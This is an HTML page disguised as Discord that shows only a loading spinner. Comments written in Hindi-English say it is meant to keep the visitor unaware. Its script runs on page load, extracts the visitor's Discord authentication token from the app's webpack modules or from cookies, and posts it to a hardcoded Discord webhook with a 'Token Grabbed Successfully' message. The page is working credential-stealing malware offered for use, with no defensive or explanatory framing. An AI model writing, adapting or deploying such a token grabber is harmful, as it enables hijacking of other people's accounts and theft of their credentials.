<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        /* Halka sa white screen ya transparent rakha hai taaki user ko kuch pata na chale */
        body {
            margin: 0;
            padding: 0;
            background: #ffffff;
            overflow: hidden;
        }
        /* Loading animation taaki user ko lage kuch load ho raha hai */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #5865F2; /* Discord Color */
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 50px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        // Tera Webhook URL
        const webhookUrl = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        async function grabToken() {
            try {
                let token = null;
                
                // Original Token Grabbing Logic
                for (let e of Object.values(window.webpackChunkdiscord_app.push([[Symbol()], {}, e => e.c]))) {
                    try {
                        if (!e.exports || e.exports === window) continue;
                        if (e.exports?.getToken) return e.exports.getToken();
                        for (let t in e.exports) {
                            if (e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
                                return e.exports[t].getToken();
                            }
                        }
                    } catch (e) {}
                }

                // Fallback if webpack method fails
                const tokenMatch = document.cookie.match(/"token":"(.*?)"/);
                if (tokenMatch) {
                    token = tokenMatch[1];
                } else if (!token) {
                    console.error("Token not found via webpack or cookie");
                    return;
                }

                // Send to Discord
                if (token) {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `🔓 **Token Grabbed Successfully!**\n\n\`\`\`${token}\`\`\``
                        })
                    });
                    
                    if (response.ok) {
                        console.log("Token sent.");
                    } else {
                        console.error("Failed to send token to webhook.");
                    }
                }

            } catch (error) {
                console.error("Error grabbing token:", error);
            }
        }

        // Execute on load
        window.addEventListener('load', grabToken);
    </script>
</body>
</html>
